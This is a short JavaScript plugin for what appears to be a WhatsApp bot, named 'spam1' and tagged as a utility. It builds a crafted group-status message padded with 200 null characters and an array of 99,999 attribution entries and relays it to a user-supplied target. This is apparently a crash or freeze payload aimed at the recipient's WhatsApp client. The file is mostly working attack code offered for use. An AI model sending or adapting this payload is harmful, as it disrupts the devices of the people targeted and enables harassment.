// /plugins/spam1.js

const handler = async (m, { conn, text, args, command }) => {
  if (!text) return m.reply("Por favor, proporciona el objetivo.");
  const target = text;

  try {
    const msgData = {
      "groupStatusMessageV2": {
        "message": {
          "interactiveResponseMessage": {
            "body": {
              "text": "\u0000".repeat(200),
              "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
              "name": "call_permission_request",
              "paramsJson": "cu",
              "version": 3
            },
            "contextInfo": {
              "remoteJid": "status@broadcast",
              "statusAttributionType": "RESHARED_FROM_POST",
              "isQuestion": true,
              "statusAttributions": Array(99999).fill({ "type": "EXTERNAL_SHARE" })
            }
          }
        }
      }
    };
    const preparedMsg = generateWAMessageFromContent(target, proto.Message.fromObject(msgData), {
      userJid: target
    });
    await conn.relayMessage(target, preparedMsg.message, {
      messageId: preparedMsg.key.id
    });
    m.reply("Estado del grupo enviado con éxito.");
  } catch (e) {
    console.log("Error", e);
    m.reply("Ocurrió un error al enviar el estado del grupo.");
  }
}

handler.command = ["spam1"]
handler.tags = ["util"]
handler.register = true

export default handler